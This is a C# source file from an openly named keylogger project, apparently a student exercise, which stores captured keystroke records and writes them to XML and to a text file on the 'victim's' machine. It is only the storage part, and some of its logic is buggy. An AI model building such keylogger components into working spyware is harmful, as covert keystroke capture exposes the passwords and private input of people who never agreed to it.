﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Xml.Serialization;

namespace ProjetEspionKeyLogger
{
    [Serializable]
    public class CollectionEnregistrement
    {
        //Liste des enregistrements
        private List<Enregistrement> list_enregistrement;

        //proprieté en lecture / ecriture
        public List<Enregistrement> ListEnregistrement
        {
            get
            {
                return list_enregistrement;
            }
        }

        //Constructeur
        public CollectionEnregistrement()
        {
            list_enregistrement = new List<Enregistrement>();
        }

        //Ajoute un enregistrement a la collection
        public void ajouter(Enregistrement enregistrement)
        {
            //mise a jour de la date
            enregistrement.dateTimeNow();

            //On ajoute a la liste l'enregistrement courrant
            list_enregistrement.Add(enregistrement);
        }

        //Méthode qui écrit la saisie dans un .txt
        private void enregistreTxt(int texte)
        {

            //chemin dynamique car on l'enregistre sur l'ordinateur de la victime
            string chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            chemin_Dossier = "C:/Users/Charlie/OneDrive/Etudes/M2 OPSIE/Csharp/ProjetEspion";

            //Si la victime n'a pas de dossier "mes documents" alors on en crée un
            if (Directory.Exists(chemin_Dossier))
            {
                Directory.CreateDirectory(chemin_Dossier);
            }

            //Création du fichier texte
            using (StreamWriter sw = File.CreateText(chemin_Dossier + @"\CaptureClavier.txt"))
            {

            }

            //Ecriture
            using (StreamWriter sw = File.AppendText(chemin_Dossier + @"\CaptureClavier.txt"))
            {
                sw.Write(texte);

            }
        }

        //sauvegarde dans un fichier XML
        public void saveToXml(string nomFichier)
        {
            //Fichier XML
             FileStream file = File.Open(nomFichier, FileMode.Create);

            //Ecriture de la collection
            XmlSerializer serializer = new XmlSerializer(typeof(CollectionEnregistrement));
            serializer.Serialize(file, this);

            //fermeture du fichier
            file.Close();
        }


        public static CollectionEnregistrement loadFromXML(string nomFichier)
        {
            FileStream file = File.Open(nomFichier, FileMode.Open);
            XmlSerializer serializer = new XmlSerializer(typeof(CollectionEnregistrement));
            CollectionEnregistrement collection_enregistrement = (CollectionEnregistrement)serializer.Deserialize(file);
            file.Close();
            return collection_enregistrement;
        }

        public void afficher()
        {
            foreach (Enregistrement enregistrement in list_enregistrement)
            {
                Console.Write(enregistrement.Date + " - " + enregistrement.Adresse +" - " + enregistrement.Contenu);
            }
                
        }

    }
}